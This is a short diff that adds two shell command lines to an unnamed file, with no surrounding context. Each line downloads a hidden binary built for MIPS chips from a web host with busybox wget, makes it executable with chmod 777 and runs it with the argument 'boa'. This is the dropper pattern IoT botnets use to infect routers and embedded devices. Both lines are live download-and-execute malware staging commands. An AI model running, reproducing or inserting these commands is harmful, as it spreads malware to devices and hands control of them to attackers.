@@ -1,0 +1,2 @@
+cd /tmp ; rm -rf mpsl ; /bin/busybox wget http://0.0.0.0/.Smpsl ; chmod 777 .Smpsl ; ./.Smpsl boa
+cd /tmp ; rm -rf mips ; /bin/busybox wget http://0.0.0.0/.Smips ; chmod 777 .Smips ; ./.Smips boa
